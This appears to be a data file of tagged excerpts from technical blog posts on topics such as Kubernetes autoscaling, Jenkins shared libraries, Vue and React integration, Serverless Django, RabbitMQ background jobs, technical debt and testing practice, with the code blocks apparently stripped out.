53,"This is the Drift into Danger model. The system is gradually made unsafe under economic and operational pressures. Safety goes unacknowledged until there is some incident. Sometimes, there are smaller incidents that are not fully investigated and not properly understood. The problem was minor, so the system is safe. These incidents, if they exist, are a canary in the mine shaft. They should be treated as valuable feedback on the systems safety.","['Reliability Engineering', 'Cache', 'Software Development', 'Software Engineering', 'Systems Thinking']",13
54,It may be confusing that the Pod Autoscaler Current vs. Desired replicas graph indicates two active replicas when only one is successfully deployed. This graph reflects the current state of the autoscaler where there is one successful replica and one pending replica.8. The log-based metric created in step 5.2.4 results in a chart illustrating that there is on average one pod scheduling failure due to insufficient CPU resources in the default namespace.9. This is derived from the Stackdriver Kubernetes Engine Cluster Operations logs for the cluster and there should be at least one entry resembling the following: This shows that the pod that is pending (notice the pod name compared to the chart above) is stuck due to insufficient CPU. The reason is that the steps in section 4.3 deployed a cluster with a single node and without node autoscaling.10. Create an additional nodepool to allow the trace-demo pod to scale and alleviate the load.,"['Kubernetes', 'Google Cloud', 'Kubernetes Engine', 'Monitoring', 'Containers']",8
55,"When I tried to explain what I do these days to my relatives, Ive tried to make a correlation and say something like you know you watch Netflix? Thats powered by the cloud, so the obvious reply always is so how do they manage to store all these movies? While public cloud does provide the ability to easily and cheaply spin up new instances whenever you need them, with great power comes great responsibility. Almost every customer weve spoken to are leveraging Terraform/Ansible/Cloudformation or some kind of automation to orchestrate the provisioning and deploy process This means they can easily create repeatable deploys, and there are fewer snowflakes floating around.","['Cloudhealth', 'Aws Cost Optimization', 'Cloud Services', 'Aws Cost Management', 'Vmware']",17
56,"There steps are pretty straight forward and involve creating an application and a bot on Slack and deploying a function on Open Whisk that you can use as a callback.1. You will be taken to your dashboard after you log in.2. Click on Functions on the left menu to launch the Open Whisk home page3. Create a new action by clicking on Start Creating.4. Give the action a name and pick Python 3 as your Runtime.5. Add the following python code to the action You can invoke this function from the UI itself. Since there is no event in the event dictionary, the action returns6. Add the following parameter by clicking on Change Input as follows: When you invoke the function now, you see the challenge is returned back as the output. This is what Slack is expecting. You can read more details here.7. Click on Endpoints and enable the action as a web action8. Go back to the Actions home page to add an API infront of your action.9. Create an API end point for your action10. Give a name, a base api path and create a new operation.11. Create an operation that listens for POST request and calls our python action12. Grab the POST URL from API Explorer Keep this URL handy. We will provide it to slack in the next section as a verification URL.1. Go to __url__ and create a new application2. Subscribe to workspace and bot events4. Enable events and add the API gateway end point POST URL.","['Slack', 'IBM', 'Openwhisk', 'Apache Openwhisk', 'Python3']",15
57,"This is a sample script using a shared library. The first line imports the library. Its format is @Library(<library name>@<branch name>). In this sample we named the library gcx. Followed by an @ and the branch name you want to checkout, here we used a tag v1.0. The function do Something() is defined in this library, so we can call this right after the import.","['Continuous Integration', 'Jenkins', 'Pipeline', 'Continuous Delivery', 'Engineering']",15
58,"While the src folder includes groovy source files ordered in packages like you probably know from Java projects, the vars folder includes source files on the top level. These files are available as global variables in your Jenkinsfile. This allows to create scripts like this: This global variable is created by adding a file log.groovy to the vars folder. Pipeline just takes the name of each file in this folder and creates a variable from it. Each file can include multiple methods. In this example its info and error. You are also able to use the source code that is in the src folder by simply importing the classes.","['Continuous Integration', 'Jenkins', 'Pipeline', 'Continuous Delivery', 'Engineering']",18
59,"The qualifier parameters do not have to be pre-defined in the Scale statement itself. But if they are defined there, without a default, then we need to define them in every scale-level statement (Past, OK, Goal, etc.) otherwise we would have an undefined situation. Maybe we could assume that = All is intended. But it is better to be explicit, and leave no doubt to the reader of your plan. This is a pervasive Planning Language rule: be explicit.","['Product Management', 'Product Development', 'Agile', 'Goal Setting', 'Project Management']",9
60,"Link to Github repository featuring full code example here Recently, one of my business partners started building an incredible B2B application using Vue and managed to make a ton of progress. At a certain point, I decided to start contributing to his project and began prototyping with Vue. I managed to achieve a lot with Vue but found myself in need of certain components which were either poorly maintained, a work in progress, or simply did not exist. This is by no means a fault of Vue as a framework, but instead, I believe its more so because a lot of the more popular and powerful React components were either made or supported by one of the tech giants, a trendy startup or a smart consulting firm. My personal belief is that its just a matter of time before more high-budget patrons adopt Vue for various reasons which will even out the playing field, but thats definitely a long and speculative conversation for another time. Anyway, rather than spend the time to build those components myself from scratch and deal with maintaining them, I decided to venture on a quest to see if I could seamlessly integrate some of the more high-end React components out there into our Vue application. A quick search led me to only one reliable result which is a fascinating open-source library called Vuera. Vuera provides a brilliant way to integrate React components into Vue components and vice versa without losing a ton of core functionality specific to Vue or React. While Vuera is still in its early stages, its still a strong potential resolution to the age-old Vue vs. React battle which has riled up a ton of contention in the front-end world.","['React', 'Vuejs', 'Front End Development', 'Software Development', 'JavaScript']",6
61,"At first, I followed the Vuera docs completely just to get acquainted with the tool. I thought the integration was absolutely fantastic however, it didnt immediately work directly with JSX. Writing React without JSX is possible but absolutely not recommended by pretty much anyone that you ask in the React community. As an enterprising React developer, my first instinct was to figure out how to integrate React components with JSX into my Vue app. Fortunately, Vue offers the ability to explicitly use render functions with JSX as oppose to Single File Components (SFCs) which feature an html templating DSL. As someone who just happens to really enjoy using the JSX syntax, I prefer it very much over the Vue templating system but I recognize the pros and cons of both. The trick is to pass the component through the Higher-Order Component (HOC) wrapper functions provided by Vuera without registering your component to your Vue instance. The output of the HOC returns exactly what babel-plugin-transform-vue-jsx is expecting as an input in your Vue render function. I explain with details and examples in my Part 2Full Tutorial post. Note that this particular technique only works for React components loaded in from external modules. Any components that you write yourself will need to be resolved with a small non-invasive little tweak to your Vue Webpack configuration that I came up with and will detail below.","['React', 'Vuejs', 'Front End Development', 'Software Development', 'JavaScript']",19
62,"Underneath the hood, both Vue and React take in HTML in a javascript-like form and process it in a way that appears to be magic to the user. They both just provide the user with syntactic sugar to make the whole process of designing views with javascript consistent, concise, convenient and organized. The primary tool responsible for this transformation is Babel. Basically, one of the main purposes of Babel is to transpile code from one form to another. In this case, were changing JSX (the humans interface) into reasonably performant, browser-compatible, and backward-compatible javascript code (the machines interface). If youre not familiar with how babel works, I would highly recommend walking through some tutorials in order to better understand the exact intuition behind my explanation.","['React', 'Vuejs', 'Front End Development', 'Software Development', 'JavaScript']",19
63,"Another important piece of context to understand before this will all make sense is Vues h function. You can read more on the Vue docs: They do an excellent job of explaining this so I wont go into too much detail. Heres a basic comparison of what Vue and React look like without the JSX syntax sugar: By default, Vues render function definition expects the h function to be passed into scope. This h function is actually just a commonly used shorthand pseudonym for create Element. The render function is simply a function that gets registered with a Vue component which lets you specify to how the Vue instance should stamp your elements into the DOM. Think of it as a more explicit set of instructions than using Vue templates. Of course, Reacts internals are a different but the concept of render functions being used to manage the DOM is very similar. In order to be more efficient, both Vue and React intelligently track and handle these changes to the DOM internally in what is referred to as the Virtual DOM. Using the transform-vue-jsx babel plugin, we can create the equivalent of our above components with JSX: Depending on your version of the babel JSX transform plugin however, you must supply h as an argument to your Vue render function or else things will break because h is not defined and thus it has no factory function for creating Vue elements. Recent updates to transform-vue-jsx have made it auto-inject the h as a parameter so you dont need to do it anymore in your Vue components as of transform-vue-jsx version 3.4.0: That said, when Webpack loads in your Vue and React components, it looks __url__ files ( __url__ if youre using typescript). By default, webpack is told to use the babel-loader to handle JSX because it contains the transform-vue-jsx babel plugin. As mentioned above, this plugin is responsible for transforming JSX into something that Vue can understand. The problem is that since Vue and React components can both __url__ (or.tsx) file extensions, Webpack doesnt know which JSX transformer plugin to use and tries to use the Vue transformer to handle both Vue and React files. The irony here is that Vue JSX and React JSX look almost 100% equivalent yet it still fails. The only difference is that funny little character h which has to be available in the scope of your Vue render function to work. So if the Vue JSX parser tries to parse your React file, it will break with error h is not defined. All you need to do to resolve this is add one more rule into your Webpack configuration to tell the babel-loader how to distinguish between Vues and Reacts JSX files.","['React', 'Vuejs', 'Front End Development', 'Software Development', 'JavaScript']",15
64,"This considers TSX files as well. In addition, you will need to suffix all of the React files in your project __url__ (or.react.tsx). What this does is tell Webpack to associate your babel-loader with the React JSX transformer __url__ __url__ files otherwise default to using the Vue JSX transformer. This was just one possible non-invasive solution that Ive come up with but, Im very much open to other ideas if anyone can think of a better way. Also, dont worry about external React component modules. You dont need to rename anything for those to work. Of course, dont forget to add react and react-dom as dependencies to your project for this process to work. You may also run into the following error when using the react babel loader: To resolve this one youll need to rename your public folder (I chose vpublic as in vue-public) and clone your __url__ into an empty public folder in your root. I dont really like the idea of having to change the name of the public folder and I understand that a lot of people might be averse to doing so. Im currently looking into better ways to do this but, if anyone has any recommendations for a better solution, feel free to drop me a line! Your resulting project structure should look like this: The Vue documentation points out specifically that not all components are best written using Vue templates. So while I acknowledge that this is not the end-all-be-all solution to the debate between frameworks, it is simply another angle on how we can use these tools to achieve our unified goal of creating powerful, reactive and robust user interfaces. Ideally, I feel as though this is a means to allowing teams to more fluidly handle the transition between frameworks regardless of their personal interests. I personally appreciate when there are ways to try new tools and frameworks in a practical setting before making too much of an initial investment and this library makes that possible. We dont have to argue about it anymore people. With a little compromise and support from the community, everyone can get what they want without so much conflict if we work together.","['React', 'Vuejs', 'Front End Development', 'Software Development', 'JavaScript']",15
65,"There are many ways one might approach the topic of web site backup best practices. I wanted to provide an article on this topic, as its something relevant to my current and potential clients, and also generally useful information for most business owners. So, lets look at some common approaches. For fun, Ill call these levels: Really, the default position many companies are in when it comes to this is that theyre doing nothing at all, which is not good. The only justification for this is an assumption that someone along the linemaybe the host, maybe the developerhas a backup of your site. But, that may or may not be the case. Of all the levels here, this is definitely the worst, and a recipe for disaster.","['Web Development', 'Web Design', 'WordPress', 'Business', 'Technology']",19
66,"Here, were getting to people who really like to be in charge of things. Hopefully, if youre someone who does this (and, I do this all the time), youre aware that, not only do the files need to be backed up, but also the database(s). If youre a Word Press or Joomla! user, my personal favorite tool to help facilitate this is Akeeba Backup. (Im not affiliated with them; theyre simply my preferred software for this. )Akeeba allows you to, with a single click, backup all of your sites files and database(s). (Itll also help you with the next few levels!) You still have to login and make that click, though, so lets level up again, shall we? For many, an even better approach is to setup a cron job on your web server to automatically pull backups on a schedule (e.g., daily, weekly, monthly) as best fits your sites needs. If your site rarely changes, then a monthly approach might be best, for example.","['Web Development', 'Web Design', 'WordPress', 'Business', 'Technology']",18
67,"The next thing we shall do is get the necessary credentials from GCP. Go to the GCP console menu and select APIs & Services then Credentials. Now click the Create Credentials button and choose Service Account Key. On the next screen choose Compute Engine default service account and JSON then click Create. This will download __url__ file to your computer, move this file to the folder where we shall write our terraform code. This file contains sensitive information so do not store it in a public repository or make it public.","['Google Cloud Platform', 'Terraform', 'DevOps']",7
68,"To begin a new Serverless project, the easiest way is to simply run the serverles create (or sls for short) command. It takes a template or a remote URL to a template, and a name. The template says which cloud provider to use - each of which requires its own authentication. Here are some examples: Once we run the command for the cloud provider of our choice, well have a new folder called serverless-django with a Python project. Beware: if you dont give it a name (serverless-django in this case) then the project will be created in the current folder. It creates a.gitignore file which would overwrite your own.gitignore file - if you have one.","['Python', 'Serverless', 'AWS', 'AWS Lambda']",7
69,"Applications almost always require secrets of some kind. Usernames, passwords, private keys - the list goes on. Django requires several, and the solution is elegant in Serverless. Either1) Place all the environment variables in its own file (yay! )or2) Put each environment variable in __url__ (nay! )Option 1 lets us store all our secrets in one place. We can keep it out of source control (for example by adding it to a.gitignore file), so we dont upload it by accident. We can store it in a password vault, letting us share it securely with our team and onboard new members easily.","['Python', 'Serverless', 'AWS', 'AWS Lambda']",7
70,"The choice is clear: well go with option 1 and place all our environment variables in its own file, which well call variables.yml. Lets create the file in the same folder as serverless.yml, and add one environment variable called THE_ANSWER to it: Next, lets add a reference to it in our __url__ so our functions can read it. At the top level of your serverless.yml, indented all the way to the left, add: This makes all the variables from our __url__ file available with ${self:custom}. Now we can make these variables available to our function. Under your function hello:, add: This adds the entire reference to custom to our function. We can now access all our variables in our function! After these changes, our __url__ looks something like this (depending on which cloud provider you chose): Lets see how this would look if we only wanted to add a single variable. Instead of referring to the entire ${self:custom}, be specific: This also lets you use a different name for the environment variable inside the function, so its not always the same as the one in your __url__ file.","['Python', 'Serverless', 'AWS', 'AWS Lambda']",15
71,"Serverless uploads our local folder to the cloud provider, so it can all run in the function we define. To install everything in the environment we want, well use virtualenv. Lets install Django so it can be used in our function: The default database SQLite is a simplistic database that saves to disk, often used on mobile devices. That is not what we want for this project. 1) it is not as compatible with cloud provider docker images which is where functions run and 2) it is not the kind of database we would want to use in production. Instead, we will use Postgre SQL: Everything installed with pip is not saved anywhere except the installation in virtualenv folder. To properly store what we have installed, we can call pip freeze to get a full overview. The standard convention is to save this to a file called __url__ so we can check it into source control: Now that we have Postgre SQL available, we can configure Django to use it. Lets create our Django project, and call it something like mydjangoproject. It can have any name, as long as its not a reserved word like python that confuses the system.","['Python', 'Serverless', 'AWS', 'AWS Lambda']",7
72,"Django and other Python web frameworks use WSGI (Web Server Gateway Interface) to handle web requests. Serverless is modular and Logan Raarup wrote a package that elegantly solves this called serverless-wsgi. Although were working with Python, Serverless packages are installed with Node.js. By running sls plugin install, Serverless will set up a __url__ and __url__ for us, and update __url__ to include the plugin: While were at it, lets also install the serverless-python-requirements package that will bundle our dependencies in our __url__ file for us: The plugin section of our serverless.ymlwill now look like this: If we tried to access Django through HTTP now, it would fail because we havent allowed any URLs (hosts in Django terms) in Django yet. We could technically open one and one, but to keep this post simple well make all URLs available in both Serverless and Django. Lets make our Serverless function accept any request: Now all requests will be sent to our hello function in the __url__ file. Lets also change the ALLOWED_HOSTS in mydjangoproject/ __url__ so Django itself allows all URLs: When Django starts up on a regular server, it begins in __url__ and simply keeps running. By comparison, Serverless runs through the entire life cycle and then quits. It is event based, and is extremely efficient because it only runs when there is something to do.","['Python', 'Serverless', 'AWS', 'AWS Lambda']",7
73,"Team Green-Pants has been working on a new Facebook-killer for the past three months, and their Product Owner is waiting impatiently for Mondays first product release. In Friday-morning standup, Jill says she successfully integrated the last piece of code, and shell be tagging the repository for deployment today. They pass the ball to Jim, the dedicated deployment guy, who after giving his update mentions By the way, Ill be in Mexico for the next two weeks. So Kara (the tech lead) asks the team in a worried tone Can anyone else handle this deploy? Shes met with silence and slowly shaking heads.","['Agile', 'Scrum Master', 'Scrum', 'Agile Scrum Methodology', 'Silos']",6
74,"Additionally, consider asking the team to collect data that shows how much technical debt there is, where it is located, and how bad it is, for example, by using code complexity, dependencies, duplication, and test coverage as indicators. There are a number of code analysis tools available that collect the appropriate data and show how adaptable the architecture and how clean the code is. [2]Once you understand the amount and severity of tech debt in your product, analyse its impact on meeting the product goals and achieving product success together with the development team. Take into account the cost of delay, the cost of not addressing the technical debt now but delaying it to a future point in time. Should you, for example, continue adding new features to the product for the next six months and plan in bigger technical improvement work afterwards? Or would it be better to address the worst debt now? Furthermore, consider the life cycle stage of your product. Technical debt is particularly bad for new and young products: If your product has a closely-coupled architecture with lots of dependencies, if it lacks (automated) tests and documentation, or if it is full of spaghetti code, then experimenting with new ideas and adapting the product to user feedback and new trends will be difficult and time-consuming. Similarly, if you want to extend its product life cycle, you may have to first remove (some of) the technical debt before you can make the necessary changes and add new features or create a variant.","['Product Management', 'Agile', 'Technical Debt', 'Innovation', 'Product Lifecycle']",13
75,"But if the technical debt is not as significant and does not need to be addressed as urgently, then plan in time for removing some debt in every sprint while continuing to improve the user experience and add or enhance features. You can do this by adding tech debt remedial items to the product backlog. This makes the necessary work visible and allows you to track it across sprints and releases. Make sure, though, that the necessary work is actually carried out and requests for more functionality dont prevent the removal of technical debt. (My article Succeeding with Innovation and Maintenance discusses how you can fix bugs and add new features at the same time. )Intentionally compromising the code quality to get a release out and accepting technical debt is all good and well as long as you actually remove the debt afterwards. Often, however, technical debt is created unintentionally in my experience.","['Product Management', 'Agile', 'Technical Debt', 'Innovation', 'Product Lifecycle']",13
76,"If you want to prevent future technical debt, then give your development team the time to learn, apply, and improve the right development practices. In fact, you should expect that the development team creates product increments with the right quality. A great way to do this is to employ a Definition of Done that states code complexity limits and test coverage targets, and to only accept work results that fulfil this definition. [1]Technical debt is a concept originally suggested by Ward Cunningham and nicely explained by Martin Fowler. Thanks to Yves Hanoullefor encouraging me to write about it. [2] I recommend that you add software quality to your KPIsand routinely track it. Quality is leading indicator: If it is decreasing, then you know that changing the product will become more and more difficult unless you do something about it. Knowing if and how much technical debt is building up helps you be proactive and avoid nasty surprises.","['Product Management', 'Agile', 'Technical Debt', 'Innovation', 'Product Lifecycle']",12
77,"Post-it notes Sharpies and pens A whiteboard (use Realtime Board or Mural if youre remote)1. Introduction (10 minutes)Your team must understand they need to dedicate two hours to this session, no phones and no laptops allowed. Ensure theyre present by starting the session with an icebreaker. Ive found that the funnier you make the game, the better the session will be. This is my favorite icebreaker, but the rest of my team would beg to differ:2. I Assume That (30 minutes)Ask everyone to write down all the things they assume to be true about the problem youre trying to solve, and the world around you. Theres no such thing as silly assumptions! This Failed Because (30 minutes)Ask everyone to write down all the reasons they think the project could fail, even ones that may seem improbable. As with assumptions, theres no such thing as silly reasons for failure! Write out reasons like this: A quick notesome people on our team like to spend the entire 60 minutes writing a mixture of assumptions and reasons for failure, theres no rules here! This is what the output for two people in a 30 minute IAT and 30 minute TFB session can look like:4. Cluster post-its (30 mins)One person chooses a note from their pile of notes, read it to the room and stick it on the whiteboard. If anyone in the team has a similar note, they stick it clustered next to that one. Youll know what I mean by similar when you start doing the exercise.5. Review notes and groupings (30 mins)Review each card, making sure it makes sense and is grouped appropriately. You should be able to summarize each group in a simple sentence. If some of your groups dont have assumptions, fix that and think of what assumption is underlying that reason for failure. Do the same for groups that dont have reasons for failure if that assumption was to be invalidated, would that cause a failure? Make sure all your groups have at least one assumption and one reason for failure if they dont then retrospectively add them.","['UX', 'Entrepreneurship', 'Startup', 'UX Research', 'Design']",0
78,"However, when we write tests we are stepping out of the prescriptive and, hopefully, engaging with something more descriptive. This is a hopeful outlook because writing tests can simply reinforce the prescriptions inherent to the implementation and, in many cases, those represent poor tests. When I write tests I want to describe the behavior of my software, not how it accomplishes that behavior. The difference is subtle, but important. As an example let us take this snippet of implementation code a starting point: There are a few ways this code could be tested, but I only want to compare two approaches. This first example, I would assert, is a poor test because of its reliance on internal implementation details: This set of tests, while providing complete coverage, is inextricably tied to how this method accomplishes its work. If at any point the specific internals of this method changes, then the tests will also need to change. In contrast, the following example tests are much better, in my opinion: These tests, specifically the last two, focus on the behavior that this method encapsulates and could even be refactored away from this model should a service object, or some other pattern be desired with most of the changes being isolated to the context of the tests, not the tests themselves. By focussing on behavior, the internal implementation can change more substantially without needing the test code to change. Only when the overall behavior of the code changes will the test case need to change significantly. This emphasis on describing what the code does, versus how it does it, is where the value of tests come from. If tests only reinforce what is already prescribed in the implementation, then they are just another layer of coupling and fragility that will need to be contended with in the future. The emphasis of good, descriptive tests should be on the effects that some code causes. Tests should answer the question, what does this code cause to change, not how does this code accomplish that change.","['Testing', 'Software Development', 'Software Engineering', 'Programming', 'Test Driven Development']",13
79,"I have walked into a few untested, or poorly tested code bases, and my initial impulse has become incredibly consistent: I try to figure out how to add tests. If a system is running then it meets some level of suitability, but sometimes it is tentative. In such code bases I prefer to write as high a level tests as possible. This trades off test runtime speed for coverage and anti-fragility. Higher level integration or acceptance tests always run slower, and cover more than unit tests. But, they also tend to be easier to write in a way that captures effects rather than methods. For this reason they can help us more rapidly build confidence around a system.","['Testing', 'Software Development', 'Software Engineering', 'Programming', 'Test Driven Development']",13
80,"Repeatedly Ive referred to code coverage. I value code coverage a lot. On all the projects I actively maintain I aim for 100% C0 coverage. There are two reasons for this: confidence and testability. Having 100% code coverage does not guarantee my code is defect free, or even correct; but it does mean I have tests that exercise every line of my code in some way. This means all my code can run. It also means that all my code is testable by way of being reachable via tests.","['Testing', 'Software Development', 'Software Engineering', 'Programming', 'Test Driven Development']",13
81,"The goal with writing tests around code is to provide confidence that the desired behaviors, the effects of the system, are in place. That is the first goal of testing. The second goal is to communicate that desired behavior to other in a way that is clear. Good code is clear code, and the same goes for tests. Tests are another form of code, and so they ought to be clear too. But, it is important to remember the different types of clarity involved: your implementation code should clearly communicate how your software does something, while the test code should clearly communicate what your software does. In this way tests provide another helpful angle for understanding a software system and why it has value.","['Testing', 'Software Development', 'Software Engineering', 'Programming', 'Test Driven Development']",13
82,"A study case of handling 10k+ row update by using csv as an input If you are new to Back End Engineering, you might think that API flow is as simple as request, process then response. Well, at least thats what I thought when I decide to start new journey as a Back End Engineer around 6 months ago. But, unfortunately, the reality is not that simple as you might already know. There are some case when the process part of an API is so heavy that it takes seconds or even minutes just to response a single request. This is of course a very bad experience for user especially at peak hours where there might be hundreds or thousands users who access your API at the same time. I mean you will never use Google if it takes at least a minute to run a single search query and there are frequent request timeout right? One of my early tasks as a Back End Engineer require me to deal with this kind of scenario by using background job, in which instead of you wait for the process to finish before giving a response, you directly give a response and left the process on the server to be processed later. In this article I will share what I learn about background job by using a study case of an admin who want to bulk update records in database.","['Docker', 'Rabbitmq', 'Sneakers', 'Rails', 'Background Jobs']",8
83,"Trust me, your life as back-end engineer will be better once you familiarize yourself with docker. In our case, using docker will help us to install Rabbitmq easier regardless of OS that you have. You can follow the instruction here to install docker. To verify docker installation, you can run docker run hello-world which will pull and run docker image called hello-world. Here is how it looks like if you successfully install docker: After that, now its time for us to prepare the installation of Rabbitmq using docker. Lets create new folder and new file called __url__ inside it. This file is basically the one that will tell docker which image it should pull and the configuration it should use when we run the image. Here is the content of __url__ file: Finally run docker-compose up to download Rabbitmq image and at the end of the installation, docker will run Rabbitmq in your console. You can kill the process using Ctrl+ and if you want to start it again you can use docker-compose start instead to only run docker image without pulling it. To check running container, you can use docker ps and you will see that rabbitmq is up and running properly at port 5672 as follow: By the way if you want to stop docker that you run with docker-compose start you can use docker-compose stop.","['Docker', 'Rabbitmq', 'Sneakers', 'Rails', 'Background Jobs']",7
84,"Now this part is optional, but in the future you might need a tutorial on how to install a Rabbitmq plugin. For those who dont really need it, you can skip to the next part. But if you think you might need it, lets try to install rabbitmq_delayed_message_exchange plugin which will enable us to delay message as follows: Go to bash in rabbitmq docker by using docker exec -ti {CONTAINER_ID} /bin/bash where you can see container id by running docker ps Go to plugins directory and download the plugin by using following command:3. Finally, you can run rabbitmq-plugins enable rabbitmq_delayed_message_exchange to enable the plugin Lets be honest, as developer refactor is part of the job that we hate the most but unfortunately, it shall be half part of our job to maintain our sanity when the next time we read our own code. In our case lets start with initiating connection between our Rails app with Rabbitmq using gem called bunny. Add gem 'bunny', '>= 2.9.2' to our Gemfile and then run bundle install. After that create new file rabbitmq_ __url__ in config/initializers/ as follow: For BUNNY_AMQP_ADDRESSES is where our Rabbitmq is running, usually at localhost:5672, for user and password you can use default login for rabbitmq which is guest | guest then for vhost, you need to create it by following command: Open rabbitmq bash again using docker exec -ti {CONTAINER_ID} /bin/bash Run rabbitmqctl add_vhost railsmq to create the vhost Run rabbitmqctl set_permissions -p railsmq guest "". *"" to set the vhost permission to our default credential Now that we have configure the connection to Rabbitmq, its time for us to publish a message to Rabbitmq by creating publisher class in publishers/mass_update_ __url__ as follow: QUEUE_NAME in the code above will be the routing_key for our message. This routing_key is important to decide which queue our message shall be sent to. In our case the message that we want to send is mutation of user balance. These mutation will be stored in the queue until there is service that consume it. That is what actually our API do which is send a message to queue to be processed later and not process the mutation directly.","['Docker', 'Rabbitmq', 'Sneakers', 'Rails', 'Background Jobs']",7
85,"Something which is manufactured and sold, or something which creates a value for users? The first definition applies only to physical products and reflects what we do with products and how we build them. The second definition is more open and modern and reflects why we need products. Physical products are tangible; users can touch them, see them, smell them and feel them. Weve all seen videos of huge factories and we can grasp how expensive and complex it is to manufacture them. Digital products live in the cloud or in remote data centres. Its harder for us to understand their size, complexity and what it means to build one. For example, if we look at the frontend of Google Search, we can only see one search line, but behind the scene, at the backend, there are hundreds of thousands of servers running and billions of lines of codes.","['Hardware', 'Software', 'Firmware', 'Product Development', 'Design']",16
86,"When software developers started to build digital products, around 25 years ago, they used similar processes and tools which were used to build physical products. The most proven process for project management, at the time, was Waterfall as it guaranteed perfection throughout the project cycle. However as digital project managers gained more experience and failed in almost half of the projects, they realised that they needed a change. They started to build their own tools and came up with their unique unconventional processes. Around 2001, more and more teams started to use Scrum and Kanban and the agile manifesto emerged. Git was created by Linus Torvalds in 2005 which laid the foundation for open source projects. Maybe for digital products perfection is not as important as agility. Today, 25 years later the development processes, the tools and the cultures of both product teams are very far apart.","['Hardware', 'Software', 'Firmware', 'Product Development', 'Design']",12
87,"During the last five years, it got extremely easy and inexpensive to embed electronics in physical products and to connect them to the internet to some kind of an appa trend which is called IOT (Internet of things). It cost around 2$ per product to do so which explains why we see so many new IOT products emerge recently, some of them are quite amusing At the product team level, this trend brings together two types of cultures, two types of processes and two types of tools. Whenever two cultures clash, interesting things begin to happen. Open source hardware is all around us now, and some people started to call themselves makers. What is the difference between a maker and a manufacturer? Are we going to see a convergence between these processes? or are we doomed, as CTOs and IOT product managers to bridge between these cultures forever? I hope you find this blog both interesting and useful and that it will help developers from all across the stack to understand each others challenges.","['Hardware', 'Software', 'Firmware', 'Product Development', 'Design']",16
88,"Throughout the years Ive seen respect between different type of developers, but also lack of knowledge. Ive seen frontend developers who think that backend is easy, and backend developers who think that frontend is boring. Ive also seen embedded developers who dont know what REST is. I mentioned before that I dont believe that professional developers and engineers should master more than one layer. I do, however, strongly believe that they should know what it means to be one and maybe even take a step further and work on a simple project which will expose them to the different challenges and processes. Broad knowledge can help in improving the communication, respect and transparency among the team members, and will also increase the creativity and productivity of the team as a whole.","['Hardware', 'Software', 'Firmware', 'Product Development', 'Design']",12
89,"Risk Analysis: Lets discuss the differences and similarities between project management of a physical product and a digital one. Personally, I like to think of project management as a risk-driven process where I constantly identify the top risks and try to come up with a plan to minimise them. Project risks are anything which affects the success of the project i.e. failing to meet the goal, deadline, scope, cost or the final quality of the products. For digital products, one of the biggest risks is to build a product which users dont need or like. Digital product managers imagine, believe, speculate and tell a good story, but until users start to interact with the product these are just assumptions. To test the assumption, product managers must ship fast, test their hypothesis and be agile. For physical products, the biggest risk is to find an irreparable problem at a very late stage, after hundreds and thousands of products were already manufactured. Manufacturing requires perfection, and without it the project will fail. To reduce this risk, physical project managers build a review and sign-off process between stages which is called Waterfall.","['Hardware', 'Software', 'Firmware', 'Product Development', 'Design']",12
90,"Every method was designed to reduce different risks, and every project manager should decide on the project plan based on risk analysis. Sometimes individuals and interactions are more important than processes and tools, and sometimes processes are more important. Sometimes working software is more important than documentation and sometimes documentation is more important. Sometimes customer collaboration is more important than written contract. And sometimes a written contract can save your company. Sometimes responding to change is important, but sometimes following a plan is more important.","['Hardware', 'Software', 'Firmware', 'Product Development', 'Design']",12
91,"Tools and team ceremonies: Project managers should use tools which implement the process by which they want to manage the projects. Microsoft Project is a great tool for waterfall projects. JIRA and Trello are a great tools for agile projects and support processes such as Kanban and Scrum. Whatever the tool is remember that its only a tool and not the essence. In Waterfall, teams meet before every fall and review documents, CAD generated outputs or test specifications. Agile team might meet every day for a daily standup and every two weeks for sprint planning. These ceremonies align the team members on the plan and improve the communication among the team members.","['Hardware', 'Software', 'Firmware', 'Product Development', 'Design']",0
92,"Design: Is there a product today where design doesnt play a major role in its success? What is a product if not something that we want to sell? Something that should be attractive and aesthetics, that we can be proud of. Gone are the days where having the right functionality and performance was good enough. For electronic products, industrial design should take into considerations not only human interaction, usability and customer experience but also the environmental conditions in which the product is being used and the manufacturing process (DFM: design for manufacturing). For digital products, the design should also address the different devices that the software might run on (mobile, desktop, big screens) and all the types of roles and users that interact with it.","['Hardware', 'Software', 'Firmware', 'Product Development', 'Design']",12
93,"Prototyping: With the help of 3D printers and VR/AR technology, its extremely easy to come up with a mechanical prototype of your physical product. You can show it your clients, put some stickers on it, connect some wires and LEDs, they will immediately understand its purpose and you might be able to convince them that your product is ready and commercial. You can place it in the real environment and see if it fit mechanically and if its easy to hold. You can make ten versions and compare between them and decide on the final configuration. There is nothing more powerful than to give your clients and investors something to hold in their hand. People like toys and tangible things and although the mechanical design is sometimes only 1% of the final product in terms of development time, people will believe that you have already completed 80% of it. With software prototyping its not as easy to get to this level. Sketch and In Vision are great tools, but users immediately understands that this is not a real product. The data is static and their interaction has no effect on it. This is part of the reason why digital product managers adopted the agile approach and the concept of MVP. Its very hard to imagine how users will interact and love your product before its ready and has real data so you want to ship it as soon as you can and start to collect real feedback.","['Hardware', 'Software', 'Firmware', 'Product Development', 'Design']",12
94,"Early decisions have the greatest impact: Every time I start a new project, I am excited. What would be the right architecture? which technology will be the best fit for it? Should we choose an 8 bit MCU or a 32 bit CPU? Is this a good project to introduce Graph QL, or shall we stick with REST again? Which wireless technology fits best the use case: Bluetooth 5 or Narrowband IOT? What is the right database to use? Postgre SQL or maybe a graph database this time? These decisions are so important for the success of the project. Sometimes, we make technical decisions too fast without proper analysis and then three months later we regret them, it becomes too hard and painful to change them, and its easier to look at the tech investment as an asset and not as a barrier. This is true both for electronic products and digital products, although changing the processor type after shipping your products to your customers is almost an impossible task if not an embarrassing one.","['Hardware', 'Software', 'Firmware', 'Product Development', 'Design']",10
95,"Development: There are many differences between the development process of electronic products and digital products, and there arent many similarities. Most of the development time for a PCB board goes into selecting the right components and designing the layout. Some of the work is purely technical, connecting wires from component U1 pin 120 to component U17 pin 12. And some tasks require complete prototyping around three types of sensors just to measure the noise and power consumption of each one of them. Embedded development is hard to debug and optimise, its quite common to see embedded developers using GPIO pins to detect if a function was called and to measure how much time it took to run. Using FPGA in your electronic product is a bold decision but sometimes is the only solution to reach your performance/cost goals. FPGA development is a completely different territory and is somewhere between ASIC development, PCB board development and embedded development. For software developers, most of the time is invested in writing code. There is something very satisfying in looking at your daily work, all those lines of code, code commits and pull requests. This sounds simple enough, but the amount of code and changes is enormous, so a proper configuration management and review process is essential to keep the code base organised, reducing the technical debt, and increasing the knowledge across the team.","['Hardware', 'Software', 'Firmware', 'Product Development', 'Design']",5
